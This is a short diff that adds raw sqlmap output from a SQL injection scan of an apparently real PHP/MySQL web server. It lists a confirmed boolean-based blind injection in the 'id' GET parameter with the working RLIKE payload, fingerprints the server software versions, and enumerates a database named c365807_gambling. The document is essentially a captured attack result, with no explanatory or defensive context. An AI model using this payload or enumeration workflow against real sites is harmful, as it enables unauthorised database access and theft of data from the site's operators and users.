@@ -1,0 +1,13 @@
+sqlmap identified the following injection point(s) with a total of 1198 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: id=185' RLIKE (SELECT (CASE WHEN (4237=4237) THEN 185 ELSE 0x28 END))-- VBlt
+---
+web server operating system: Linux CentOS 6.8
+web application technology: PHP 5.3.3, Apache 2.2.15
+back-end DBMS: MySQL >= 5.0.0
+available databases [1]:
+[*] c365807_gambling
+
